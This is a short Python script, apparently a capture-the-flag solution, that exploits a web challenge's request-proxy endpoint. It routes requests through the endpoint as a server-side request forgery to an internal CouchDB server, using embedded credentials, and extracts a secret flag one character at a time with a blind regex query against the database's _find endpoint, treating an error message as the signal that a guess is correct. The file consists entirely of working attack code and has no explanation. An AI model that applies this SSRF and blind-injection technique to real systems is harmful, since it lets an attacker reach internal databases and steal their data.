import string
import requests
import json

url = 'https://requester.mc.ax/testAPI'
flag = ''

for i in range(1,50):
    for char in string.ascii_letters+string.digits+'{}_':
        print(char,end="\r")
        temp = flag + char
        params = {"url":"http://taidh1:taidh1@Couchdb:5984/taidh1/_find","method":"POST","data":json.dumps({"selector":{"flag":{"$regex":f"^{temp}"}}})}
        r = requests.get(url=url,params=params)
        # print(r.text)
        if "Something went wrong" in r.text:
            flag += char
            print(flag)
            break